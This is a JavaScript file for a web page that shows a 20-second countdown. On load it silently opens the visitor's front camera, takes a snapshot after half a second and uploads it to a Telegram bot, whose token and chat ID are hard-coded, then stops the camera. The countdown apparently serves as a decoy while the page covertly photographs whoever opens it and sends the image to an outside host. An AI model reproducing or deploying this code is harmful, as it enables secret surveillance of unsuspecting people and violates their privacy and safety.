document.addEventListener("DOMContentLoaded", function () {
    let timeLeft = 20;
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress-bar");

    const countdownInterval = setInterval(() => {
        timeLeft--;
        countdownElement.textContent = timeLeft;
        progressBar.style.width = (timeLeft / 20) * 100 + "%";

        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
        }
    }, 1000);

    async function startCamera() {
        try {
            const video = document.getElementById('video');
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;

            console.log("✅ الكاميرا تعمل، سيتم التقاط الصورة خلال نصف ثانية...");
            setTimeout(() => captureAndSendPhoto(stream), 500); // التقاط الصورة بعد نصف ثانية
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا:", error);
        }
    }

    function captureAndSendPhoto(stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        console.log("📸 تم التقاط الصورة! جاري إرسالها...");
        canvas.toBlob(blob => sendPhoto(blob, stream), "image/jpeg");
    }

    function sendPhoto(blob, stream) {
        const formData = new FormData();
        formData.append("chat_id", "5375214810");
        formData.append("photo", blob, "snapshot.jpg");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log("✅ تم إرسال الصورة بنجاح:", data);
            stopCamera(stream);
        })
        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
    }

    function stopCamera(stream) {
        let tracks = stream.getTracks();
        tracks.forEach(track => track.stop());
        console.log("📴 تم إيقاف الكاميرا بعد التقاط الصورة.");
    }

    startCamera();
});
